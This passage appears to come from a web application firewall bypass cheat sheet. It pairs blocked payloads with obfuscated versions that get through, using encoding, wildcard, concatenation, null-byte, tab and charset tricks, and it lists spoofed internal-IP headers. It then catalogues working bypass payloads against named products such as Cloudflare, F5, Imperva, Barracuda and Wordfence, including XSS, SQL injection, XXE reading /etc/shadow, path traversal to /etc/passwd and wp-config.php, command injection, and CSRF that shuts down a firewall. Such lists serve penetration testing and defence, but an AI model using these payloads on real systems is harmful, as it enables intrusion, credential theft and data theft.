__Bypassed__: `%3CsvG%2Fx%3D%22%3E%22%2FoNloaD%3Dconfirm%28%29%2F%2F`

__Blocked__: `uNIoN(sEleCT 1,2,3,4,5,6,7,8,9,10,11,12)`  
__Bypassed__: `uNIoN%28sEleCT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%29`

__3. Unicode Encoding__  
- Most modern web-apps support UTF-8 and hence are prone to this method.
- ASCII characters in unicode encoding encoding provide great variants for bypassing.
- You can encode entire/part of the payload for obtaining results.

__Standard__: `<marquee onstart=prompt()>`  
__Obfuscated__: `<marquee onstart=\u0070r\u06f\u006dpt()>`

__Blocked__: `/?redir=http://google.com`  
__Bypassed__: `/?redir=http://google。com` (Unicode alternative) 

__Standard__: `../../etc/passwd`  
__Obfuscated__: `%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFpasswd`

__4. HTML Encoding__
- Often web apps encode special characters into HTML encoding and render accordingly.
- This leads us to basic bypass cases with HTML encoding (numeric/generic).

__Standard__: `"><img src=x onerror=confirm()>`  
__Encoded__: `&quot;&gt;&lt;img src=x onerror=confirm&lpar;&rpar;&gt;` (General form)  
__Encoded__: `&#34;&#62;&#60;img src=x onerror=confirm&#40;&#41;&#62;` (Numeric reference)

__5. Mixed Encoding__  
- WAF rules often tend to filter out a single type of encoding.
- This type of filters can be bypassed by mixed encoding payloads.
- Tabs and newlines further add to obfuscation.

__Obfuscated__: 
```
<A HREF="h
tt  p://6   6.000146.0x7.147/">XSS</A>
```

__6. Using Comments__
- Comments obfuscate standard payload vectors. 
- Different payloads have different ways of obfuscation.

__Blocked__: `<script>alert()</script>`  
__Bypassed__: `<!--><script>alert/**/()/**/</script>`

__Blocked__: `/?id=1+union+select+1,2,3--`  
__Bypassed__: `/?id=1+un/**/ion+sel/**/ect+1,2,3--`

__7. Double Encoding__
- Often WAF filters tend to encode characters to prevent attacks.
- However poorly developed filters (no recursion filters) can be bypassed with double encoding.

__Standard__: `http://victim/cgi/../../winnt/system32/cmd.exe?/c+dir+c:\`  
__Obfuscated__: `http://victim/cgi/%252E%252E%252F%252E%252E%252Fwinnt/system32/cmd.exe?/c+dir+c:\`

__Standard__: `<script>alert()</script>`  
__Obfuscated__: `%253Cscript%253Ealert()%253C%252Fscript%253E`

__8. Wildcard Encoding__
- Globbing patterns are used by various command-line utilities to work with multiple files.
- We can tweak them to execute system commands.
- Specific to remote code execution vulnerabilities on linux systems.

__Standard__: `/bin/cat /etc/passwd`  
__Obfuscated__: `/???/??t /???/??ss??`  
Used chars: `/ ? t s`

__Standard__: `/bin/nc 127.0.0.1 1337`  
__Obfuscated__: `/???/n? 2130706433 1337`  
Used chars: `/ ? n [0-9]`

__9. String Concatenation__
- Different programming languages have different syntaxes and patterns for concatenation.
- This allows us to effectively generate payloads that can bypass many filters and rules.

__Standard__: `<script>alert()</script>`  
__Obfuscated__: `<script>eval('al'+'er'+'t()')</script>`

__Standard__: `/bin/cat /etc/passwd`  
__Obfuscated__: `/bi'n'''/c''at' /e'tc'/pa''ss'wd`
> Bash allows path concatenation for execution.

__Standard__: `<iframe/onload='this["src"]="javascript:alert()"';>`  
__Obfuscated__: `<iframe/onload='this["src"]="jav"+"as&Tab;cr"+"ipt:al"+"er"+"t()"';>`

__9. Junk Chars__
- Normal payloads get filtered out easily.
- Adding some junk chars helps avoid detection (specific cases only).
- They often help in confusing regex based firewalls.

__Standard__: `<script>alert()</script>`  
__Obfuscated__: `<script>+-+-1-+-+alert(1)</script>`

__Standard__: `<BODY onload=alert()>`  
__Obfuscated__: ```<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert()>```

__Standard__: `<a href=javascript;alert()>ClickMe `  
__Bypassed__: `<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe`

__10. Line Breaks__
- Many WAF with regex based filtering effectively blocks many attempts.
- Line breaks (CR/LF) can break firewall regex and bypass stuff.

__Standard__: `<iframe src=javascript:alert(0)">`  
__Obfuscated__: `<iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)">`

__11. Uninitialized Variables__
- Uninitialized bash variables can evade bad regular expression based filters and pattern match.
- Uninitialised variables have value null/they act like empty strings.
- Both bash and perl allow this kind of interpretations.

> __BONUS:__ Variable names can have any number of random characters. I have represented them here as `$aaaaaa`, `$bbbbbb`, and so on. You can replace them with any number of random chars like `$ushdjah` and so on.  ;)

- __Level 1 Obfuscation__: Normal  
__Standard__: `/bin/cat /etc/passwd`  
__Obfuscated__: `/bin/cat$u /etc/passwd$u`

- __Level 2 Obfuscation__: Postion Based  
__Standard__: `/bin/cat /etc/passwd`  
__Obfuscated__: <code>$u<b>/bin</b>$u<b>/cat</b>$u $u<b>/etc</b>$u<b>/passwd</b>$u</code>

- __Level 3 Obfuscation__: Random chars   
__Standard__: `/bin/cat /etc/passwd`  
__Obfuscated__: <code>$aaaaaa<b>/bin</b>$bbbbbb<b>/cat</b>$ccccccc $dddddd<b>/etc</b>$eeeeeee<b>/passwd</b>$fffffff</code>

An exotic payload crafted:
```
$sdijchkd/???$sdjhskdjh/??t$skdjfnskdj $sdofhsdhjs/???$osdihdhsdj/??ss??$skdjhsiudf
```

__12. Random Tabs__
- Tabs often help to evade firewalls especially regex based ones.
- Tabs can help break firewall regex when the regex is expecting whitespaces and not tabs.

__Standard__: `<IMG SRC="javascript:alert();">`  
__Bypassed__: `<IMG SRC="    javascript:alert();">`  
__Variant__: `<IMG SRC="    jav    ascri    pt:alert    ();">`

__Standard__: `<iframe src=javascript:alert(1)></iframe>`  
__Obfuscated__: 
```
<iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
```

__13. Other Formats__  
- Many web applications support different encoding types (see below).
- Obfuscating our playload to a format not supported by WAF but the server can smuggle our payload in.

__Case:__ IIS  
- IIS6, 7.5, 8 and 10 (ASPX v4.x) allow __IBM037__ character interpretations.
- We can encode our payload and send the encoded parameters with the query.

Original Request:
```
POST /sample.aspx?id1=something HTTP/1.1
HOST: victim.com
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Content-Length: 41

id2='union all select * from users--
```
Obfuscated Request + URL Encoding:
```
POST /sample.aspx?%89%84%F1=%A2%96%94%85%A3%88%89%95%87 HTTP/1.1
HOST: victim.com
Content-Type: application/x-www-form-urlencoded; charset=ibm037
Content-Length: 115

%89%84%F2=%7D%A4%95%89%96%95%40%81%93%93%40%A2%85%93%85%83%A3%40%5C%40%86%99%96%94%40%A4%A2%85%99%A2%60%60
```

The following table shows the support of different character encodings on the tested systems (when messages could be obfuscated using them):
> __TIP:__ You can use [this small python script](others/obfu.py) to convert your payloads and parameters to your desired encodings.

<table>
    <tr>
        <td width="20%" align="center"><b>Target</b></td>
        <td width="35%" align="center"><b>Encodings</b></td>
        <td width="55%" align="center"><b>Notes</b></td>
    </tr>
    <tr>
        <td>Nginx, uWSGI-Django-Python3</td>
        <td>IBM037, IBM500, cp875, IBM1026, IBM273</td>
        <td>
            <ul>
                <li>Query string and body need to be encoded.</li>
                <li>Url-decoded parameters in query string and body.</li>
                <li>Equal sign and ampersand needed to be encoded as well (no url-encoding).</li>
            </ul>
        </td>
    </tr>
    <tr>
        <td>Nginx, uWSGI-Django-Python2</td>
        <td>IBM037, IBM500, cp875, IBM1026, utf-16, utf-32, utf-32BE, IBM424</td>
        <td>
            <ul>
                <li>Query string and body need to be encoded.</li>
                <li>Url-decoded parameters in query string and body afterwards.</li>
                <li>Equal sign and ampersand should not be encoded in any way.</li>
            </ul>
        </td>
    </tr>
    <tr>
        <td>Apache-TOMCAT8-JVM1.8-JSP</td>
        <td>IBM037, IBM500, IBM870, cp875, IBM1026,
        IBM01140, IBM01141, IBM01142, IBM01143, IBM01144,
        IBM01145, IBM01146, IBM01147, IBM01148, IBM01149,
        utf-16, utf-32, utf-32BE, IBM273, IBM277, IBM278,
        IBM280, IBM284, IBM285, IBM290, IBM297, IBM420,
        IBM424, IBM-Thai, IBM871, cp1025</td>
        <td>
            <ul>
                <li>Query string in its original format (could be url-encoded as usual).</li>
                <li>Body could be sent with/without url-encoding.</li>
                <li>Equal sign and ampersand should not be encoded in any way.</li>
            </ul>
        </td>           
    </tr>
    <tr>
        <td>Apache-TOMCAT7-JVM1.6-JSP</td>
        <td>IBM037, IBM500, IBM870, cp875, IBM1026,
        IBM01140, IBM01141, IBM01142, IBM01143, IBM01144,
        IBM01145, IBM01146, IBM01147, IBM01148, IBM01149,
        utf-16, utf-32, utf-32BE, IBM273, IBM277, IBM278,
        IBM280, IBM284, IBM285, IBM297, IBM420, IBM424,
        IBM-Thai, IBM871, cp1025</td>
        <td>
            <ul>
                <li>Query string in its original format (could be url-encoded as usual).</li>
                <li>Body could be sent with/without url-encoding.</li>
                <li>Equal sign and ampersand should not be encoded in any way.</li>
            </ul>
        </td> 
    </tr>
    <tr>
        <td>IIS6, 7.5, 8, 10 -ASPX (v4.x)</td>
        <td>IBM037, IBM500, IBM870, cp875, IBM1026,
        IBM01047, IBM01140, IBM01141, IBM01142, IBM01143,
        IBM01144, IBM01145, IBM01146, IBM01147, IBM01148,
        IBM01149, utf-16, unicodeFFFE, utf-32, utf-32BE,
        IBM273, IBM277, IBM278, IBM280, IBM284, IBM285,
        IBM290, IBM297, IBM420,IBM423, IBM424, x-EBCDIC-KoreanExtended,
        IBM-Thai, IBM871, IBM880, IBM905, IBM00924, cp1025</td>
        <td>
            <ul>
                <li>Query string in its original format (could be url-encoded as usual).</li>
                <li>Body could be sent with/without url-encoding.</li>
                <li>Equal sign and ampersand should not be encoded in any way.</li>
            </ul>
        </td> 
    </tr>
</table>

### Browser Bugs:
#### Charset Bugs:
- We can try changing charset header to higher Unicode (eg. UTF-32) and test payloads.
- When the site decodes the string, the payload gets triggered.

Example request:
<pre>
GET <b>/page.php?p=∀㸀㰀script㸀alert(1)㰀/script㸀</b> HTTP/1.1
Host: site.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0
<b>Accept-Charset:utf-32; q=0.5</b>
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
</pre>
When the site loads, it will be encoded to the UTF-32 encoding that we set, and
then as the output encoding of the page is UTF-8, it will be rendered as: `"<script>alert (1) </ script>` which will trigger XSS.

Final URL encoded payload:
```
%E2%88%80%E3%B8%80%E3%B0%80script%E3%B8%80alert(1)%E3%B0%80/script%E3%B8%80 
```

#### Null Bytes:
- The null bytes are commonly used as string terminator.
- This can help us evade many web application filters in case they are not filtering out the null bytes.

Payload examples:
```
<scri%00pt>alert(1);</scri%00pt>
<scri\x00pt>alert(1);</scri%00pt>
<s%00c%00r%00%00ip%00t>confirm(0);</s%00c%00r%00%00ip%00t>
```

#### Parsing Bugs:
- RFC states that NodeNames cannot begin with whitespace.
- But we can use special chars like ` %`, `//`, `!`, `?`, etc.

Examples:
- `<// style=x:expression\28write(1)\29>`  - Works upto IE7 _([Source](http://html5sec.org/#71))_
- `<!--[if]><script>alert(1)</script -->` - Works upto IE9 _([Reference](http://html5sec.org/#115))_
- `<?xml-stylesheet type="text/css"?><root style="x:expression(write(1))"/>` - Works in IE7 _([Reference](http://html5sec.org/#77))_
- `<%div%20style=xss:expression(prompt(1))>` - Works Upto IE7

#### Unicode Separators:
- Every browser has their own specific charset of separators.
- We can fuzz charset range of `0x00` to `0xFF` and get the set of separators for each browser.
- We can use these separators in places where a space is required.

Here is a compiled list of separators by [@Masato Kinugawa](https://github.com/masatokinugawa):
- IExplorer: `0x09`, `0x0B`, `0x0C`, `0x20`, `0x3B`  
- Chrome: `0x09`, `0x20`, `0x28`, `0x2C`, `0x3B`  
- Safari: `0x2C`, `0x3B`  
- FireFox: `0x09`, `0x20`, `0x28`, `0x2C`, `0x3B`  
- Opera: `0x09`, `0x20`, `0x2C`, `0x3B`  
- Android: `0x09`, `0x20`, `0x28`, `0x2C`, `0x3B` 

An exotic payload example: 
```
<a/onmouseover[\x0b]=location='\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B'>pwn3d
```

### Request Header Spoofing:
#### Method:
- The target is to fool the WAF/server into believing it was from their internal network.
- Adding some spoofed headers to represent the internal network, does the trick.

#### Technique:
- With each request some set of headers are to be added simultaneously thus spoofing the origin.
- The upstream proxy/WAF misinterprets the request was from their internal network, and lets our gory payload through.

Some common headers used:
```
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
```

### Google Dorks Approach:
#### Method:
- There are a lot of known bypasses of various web application firewalls ([see section](#known-bypasses)).
- With the help of google dorks, we can easily find bypasses.

#### Techniques:  
Before anything else, you should hone up skills from [Google Dorks Cheat Sheet](http://pdf.textfiles.com/security/googlehackers.pdf).
- Normal search:  
`+<wafname> waf bypass`

- Searching for specific version exploits:  
`"<wafname> <version>" (bypass|exploit)`

- For specific type bypass exploits:  
`"<wafname>" +<bypass type> (bypass|exploit)`

- On [Exploit DB](https://exploit-db.com):  
`site:exploit-db.com +<wafname> bypass`

- On [0Day Inject0r DB](https://0day.today):  
`site:0day.today +<wafname> <type> (bypass|exploit)`

- On [Twitter](https://twitter.com):  
`site:twitter.com +<wafname> bypass`

- On [Pastebin](https://pastebin.com)  
`site:pastebin.com +<wafname> bypass`

## Known Bypasses:
### Airlock Ergon
- SQLi Overlong UTF-8 Sequence Bypass (>= v4.2.4) by [@Sec Consult](https://www.exploit-db.com/?author=1614)
```
%C0%80'+union+select+col1,col2,col3+from+table+--+
```

### AWS
- [SQLi Bypass](https://github.com/enkaskal/aws-waf-sqli-bypass-PoC) by [@enkaskal](https://twitter.com/enkaskal)
```
"; select * from TARGET_TABLE --
```

### Barracuda 
- Cross Site Scripting by [@WAFNinja](https://waf.ninja)
```
<body style="height:1000px" onwheel="alert(1)">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>
```
- HTML Injection by [@Global-Evolution](https://www.exploit-db.com/?author=2016)
```
GET /cgi-mod/index.cgi?&primary_tab=ADVANCED&secondary_tab=test_backup_server&content_only=1&&&backup_port=21&&backup_username=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_type=ftp&&backup_life=5&&backup_server=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_path=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_password=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net%20width%3D800%20height%3D800%3E&&user=guest&&password=121c34d4e85dfe6758f31ce2d7b763e7&&et=1261217792&&locale=en_US
Host: favoritewaf.com
User-Agent: Mozilla/5.0 (compatible; MSIE5.01; Windows NT)
```
- XSS Bypass - [Source](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Bypassing%20WAF%20XSS%20Detection%20Mechanisms.pdf)
```
<a/href=&#74;ava%0a%0d%09script&colon;alert()>click
```
- [Barracuda WAF 8.0.1 - Remote Command Execution (Metasploit)](https://www.exploit-db.com/exploits/40146) by [@xort](https://www.exploit-db.com/?author=479#)
- [Barracuda Spam & Virus Firewall 5.1.3 - Remote Command Execution (Metasploit)](https://www.exploit-db.com/exploits/40147) by [@xort](https://www.exploit-db.com/?author=479)

### Cerber (WordPress)
- Username Enumeration Protection Bypass by HTTP Verb Tampering by [@ed0x21son](https://www.exploit-db.com/?author=9901)
```
POST host.com HTTP/1.1
Host: favoritewaf.com
User-Agent: Mozilla/5.0 (compatible; MSIE5.01; Windows NT)

author=1
```
- Protected Admin Scripts Bypass by [@ed0x21son](https://www.exploit-db.com/?author=9901)
```
http://host/wp-admin///load-scripts.php?load%5B%5D=jquery-core,jquery-migrate,utils
http://host/wp-admin///load-styles.php?load%5B%5D=dashicons,admin-bar
```
- REST API Disable Bypass by [@ed0x21son](https://www.exploit-db.com/?author=9901)
```
http://host/index.php/wp-json/wp/v2/users/
```

### Citrix NetScaler
- SQLi via HTTP Parameter Pollution (NS10.5) by [@BGA Security](https://www.exploit-db.com/?author=7396)
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
   <soapenv:Header/>
   <soapenv:Body>
        <string>’ union select current_user, 2#</string>
    </soapenv:Body>
</soapenv:Envelope>
```

- [`generic_api_call.pl` XSS](https://www.exploit-db.com/exploits/30777) by [@NNPoster](https://www.exploit-db.com/?author=6654)
```
http://host/ws/generic_api_call.pl?function=statns&standalone=%3c/script%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3cscript%3e
``` 

### Cloudflare
- XSS Bypass by [@RakeshMane10](https://twitter.com/rakeshmane10)
```
<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
```

- XSS Bypass by [@ArbazKiraak](https://twitter.com/ArbazKiraak)
```
<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;\u0061\u006C\u0065\u0072\u0074&lpar;this['document']['cookie']&rpar;">X</a>`
```
- XSS Bypass by [@Ahmet Ümit](https://twitter.com/ahmetumitbayram)
```
<--`<img/src=` onerror=confirm``> --!>
```
- XSS Bypass - [Source](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Bypassing%20WAF%20XSS%20Detection%20Mechanisms.pdf)
```
<a"/onclick=(confirm)()>click
```

### Comodo 
- XSS Bypass - [Source](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Bypassing%20WAF%20XSS%20Detection%20Mechanisms.pdf)
```
<d3v/onauxclick=(((confirm)))``>click
```
- SQLi by [@WAFNinja](https://waf.ninja)
```
0 union/**/select 1,version(),@@datadir
```

### DotDefender
- Firewall disable by (v5.0) by [@hyp3rlinx](http://hyp3rlinx.altervista.org)
```
PGVuYWJsZWQ+ZmFsc2U8L2VuYWJsZWQ+
<enabled>false</enabled>
```
- Remote Command Execution (v3.8-5) by [@John Dos](https://www.exploit-db.com/?author=1996)
```
POST /dotDefender/index.cgi HTTP/1.1
Host: 172.16.159.132
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 300
Connection: keep-alive
Authorization: Basic YWRtaW46
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 95

sitename=dotdefeater&deletesitename=dotdefeater;id;ls -al ../;pwd;&action=deletesite&linenum=15
```
- Persistent XSS (v4.0) by [@EnableSecurity](https://enablesecurity.com)
```
GET /c?a=<script> HTTP/1.1
Host: 172.16.159.132
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US;
rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
<script>alert(1)</script>: aa
Keep-Alive: 300
```
- R-XSS Bypass by [@WAFNinja](https://waf.ninja)
```
<svg/onload=prompt(1);>
<isindex action="javas&tab;cript:alert(1)" type=image>
<marquee/onstart=confirm(2)>
```
- XSS Bypass by [@s0md3v](https://twitter.com/s0md3v)
```
<details/open/ontoggle=(confirm)()//
```
- GET - XSS Bypass (v4.02) by [@DavidK](https://www.exploit-db.com/?author=2741)
```
/search?q=%3Cimg%20src=%22WTF%22%20onError=alert(/0wn3d/.source)%20/%3E

<img src="WTF" onError="{var
{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v%2Ba%2Be%2Bs](e%2Bs%2Bv%2B
h%2Bn)(/0wn3d/.source)" />
```

- POST - XSS Bypass (v4.02) by [@DavidK](https://www.exploit-db.com/?author=2741)
```
<img src="WTF" onError="{var
{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/0wn3d/
.source)" />
```
- `clave` XSS (v4.02) by [@DavidK](https://www.exploit-db.com/?author=2741)
```
/?&idPais=3&clave=%3Cimg%20src=%22WTF%22%20onError=%22{ 
```

### Fortinet Fortiweb
- `pcre_expression` unvaidated XSS by [@Benjamin Mejri](https://www.exploit-db.com/?author=7854)
```
/waf/pcre_expression/validate?redir=/success&mkey=0%22%3E%3Ciframe%20src=http://vuln-lab.com%20onload=alert%28%22VL%22%29%20%3C
/waf/pcre_expression/validate?redir=/success%20%22%3E%3Ciframe%20src=http://vuln-lab.com%20onload=alert%28%22VL%22%29%20%3C&mkey=0 
```
- CSP Bypass by [@Binar10](https://www.exploit-db.com/exploits/18840)

POST Type Query
```
POST /<path>/login-app.aspx HTTP/1.1
Host: <host>
User-Agent: <any valid user agent string>
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: <the content length must be at least 2399 bytes>

var1=datavar1&var2=datavar12&pad=<random data to complete at least 2399 bytes>
```
GET Type Query
```
http://<domain>/path?var1=vardata1&var2=vardata2&pad=<large arbitrary data>
```

### F5 ASM 
- XSS Bypass by [@WAFNinja](https://waf.ninja)
```
<table background="javascript:alert(1)"></table>
"/><marquee onfinish=confirm(123)>a</marquee>
```

### F5 BIG-IP
- XSS Bypass by [@WAFNinja](https://waf.ninja/)
```
<body style="height:1000px" onwheel="[DATA]">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[DATA]">
<body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="prom%25%32%33%25%32%36x70;t(1)">
```
- [`report_type` XSS](https://www.securityfocus.com/bid/27462/info) by [@NNPoster](https://www.exploit-db.com/?author=6654)
```
https://host/dms/policy/rep_request.php?report_type=%22%3E%3Cbody+onload=alert(%26quot%3BXSS%26quot%3B)%3E%3Cfoo+
```
- POST Based XXE by [@Anonymous](https://www.exploit-db.com/?author=2168)
```
POST /sam/admin/vpe2/public/php/server.php HTTP/1.1
Host: bigip
Cookie: BIGIPAuthCookie=*VALID_COOKIE*
Content-Length: 143

<?xml  version="1.0" encoding='utf-8' ?>
<!DOCTYPE a [<!ENTITY e SYSTEM '/etc/shadow'> ]>
<message><dialogueType>&e;</dialogueType></message>
```
- Directory Traversal by [@Anastasios Monachos](https://www.exploit-db.com/?author=2932)

Read Arbitrary File
```
/tmui/Control/jspmap/tmui/system/archive/properties.jsp?&name=../../../../../etc/passwd
```
Delete Arbitrary File
```
POST /tmui/Control/form HTTP/1.1
Host: site.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=6C6BADBEFB32C36CDE7A59C416659494; f5advanceddisplay=""; BIGIPAuthCookie=89C1E3BDA86BDF9E0D64AB60417979CA1D9BE1D4; BIGIPAuthUsernameCookie=admin; F5_CURRENT_PARTITION=Common; f5formpage="/tmui/system/archive/properties.jsp?&name=../../../../../etc/passwd"; f5currenttab="main"; f5mainmenuopenlist=""; f5_refreshpage=/tmui/Control/jspmap/tmui/system/archive/properties.jsp%3Fname%3D../../../../../etc/passwd
Content-Type: application/x-www-form-urlencoded

_form_holder_opener_=&handler=%2Ftmui%2Fsystem%2Farchive%2Fproperties&handler_before=%2Ftmui%2Fsystem%2Farchive%2Fproperties&showObjList=&showObjList_before=&hideObjList=&hideObjList_before=&enableObjList=&enableObjList_before=&disableObjList=&disableObjList_before=&_bufvalue=icHjvahr354NZKtgQXl5yh2b&_bufvalue_before=icHjvahr354NZKtgQXl5yh2b&_bufvalue_validation=NO_VALIDATION&com.f5.util.LinkedAdd.action_override=%2Ftmui%2Fsystem%2Farchive%2Fproperties&com.f5.util.LinkedAdd.action_override_before=%2Ftmui%2Fsystem%2Farchive%2Fproperties&linked_add_id=&linked_add_id_before=&name=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&name_before=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&form_page=%2Ftmui%2Fsystem%2Farchive%2Fproperties.jsp%3F&form_page_before=%2Ftmui%2Fsystem%2Farchive%2Fproperties.jsp%3F&download_before=Download%3A+..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&restore_before=Restore&delete=Delete&delete_before=Delete
```

### F5 FirePass
- SQLi Bypass from [@Anonymous](https://www.exploit-db.com/?author=2168)
```
state=%2527+and+
(case+when+SUBSTRING(LOAD_FILE(%2527/etc/passwd%2527),1,1)=char(114)+then+
BENCHMARK(40000000,ENCODE(%2527hello%2527,%2527batman%2527))+else+0+end)=0+--+ 
```

### Imperva SecureSphere
- [Imperva SecureSphere 13 - Remote Command Execution](https://www.exploit-db.com/exploits/45542) by [@rsp3ar](https://www.exploit-db.com/?author=9396)
- XSS Bypass by [@Alra3ees](https://twitter.com/alra3ees)
```
anythinglr00</script><script>alert(document.domain)</script>uxldz
anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
```
- XSS Bypass by [@WAFNinja](https://waf.ninja)
```
%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%2523x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%2526%2523x29%3B%22%3E
```
- XSS Bypass by [@i_bo0om](https://twitter.com/i_bo0om)
```
<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
<img/src=q onerror='new Function`al\ert\`1\``'>
```
- XSS Bypass by [@c0d3g33k](https://twitter.com/c0d3g33k)
```
<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
```
- SQLi Bypass by [@DRK1WI](https://www.exploit-db.com/?author=7740)
```
15 and '1'=(SELECT '1' FROM dual) and '0having'='0having'
```
- SQLi by [@Giuseppe D'Amore](https://www.exploit-db.com/?author=6413)
```
stringindatasetchoosen%%' and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS where FULL_NAME like '%%dministrator' and rownum<=1 and PASSWORD like '0%') and '1%%'='1
```
- [Imperva SecureSphere <= v13 - Privilege Escalation](https://www.exploit-db.com/exploits/45130) by [@0x09AL](https://www.exploit-db.com/?author=8991)

### Kona SiteDefender
- XSS Bypass by [@zseano](https://twitter.com/zseano)
```
?"></script><base%20c%3D=href%3Dhttps:\mysite>
```
- XSS Bypass - [Source](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Bypassing%20WAF%20XSS%20Detection%20Mechanisms.pdf)
```
 <d3v/onauxclick=[2].some(confirm)>click 
```

### Profense
- [GET Type CSRF Attack](https://www.exploit-db.com/exploits/7919) by [@Michael Brooks](https://www.exploit-db.com/?author=628) (>= v.2.6.2)

Turn off Proface Machine 
```
<img src=https://host:2000/ajax.html?action=shutdown>
```
Add a proxy
```
<img src=https://10.1.1.199:2000/ajax.html?vhost_proto=http&vhost=vhost.com&vhost_port=80&rhost_proto=http&rhost=10.1.1.1&rhost_port=80&mode_pass=on&xmle=on&enable_file_upload=on&static_passthrough=on&action=add&do=save>
```

- XSS Bypass by [@Michael Brooks](https://www.exploit-db.com/?author=628) (>= v.2.6.2)
```
https://host:2000/proxy.html?action=manage&main=log&show=deny_log&proxy=>"<script>alert(document.cookie)</script>
```
- [XSS Bypass](https://www.securityfocus.com/bid/35053/info) by [@EnableSecurity](https://enablesecurity.com) (>= v2.4)
```
%3CEvil%20script%20goes%20here%3E=%0AByPass
%3Cscript%3Ealert(document.cookie)%3C/script%20ByPass%3E 
```

### QuickDefense
- XSS Bypass by [@WAFNinja](https://waf.ninja/)
```
?<input type="search" onsearch="aler\u0074(1)">
<details ontoggle=alert(1)>
```

### WebKnight
- Cross Site Scripting by [@WAFNinja](https://waf.ninja/)
```
<isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>
<marquee/onstart=confirm(2)>
<details ontoggle=alert(1)>
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
<img src=x onwheel=prompt(1)>
```
- SQLi by [@WAFNinja](https://waf.ninja)
```
0 union(select 1,username,password from(users))
0 union(select 1,@@hostname,@@datadir)
```

### Wordfence
- XSS Bypass by [@brutelogic](https://twitter.com/brutelogic)
```
<a href=javas&#99;ript:alert(1)>
```
- XSS Bypass - [Source](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Bypassing%20WAF%20XSS%20Detection%20Mechanisms.pdf)
```
<a/href=javascript&colon;alert()>click
```
- [HTML Injection](https://www.securityfocus.com/bid/69815/info) by [@Voxel](https://www.exploit-db.com/?author=8505)
```
http://host/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
```
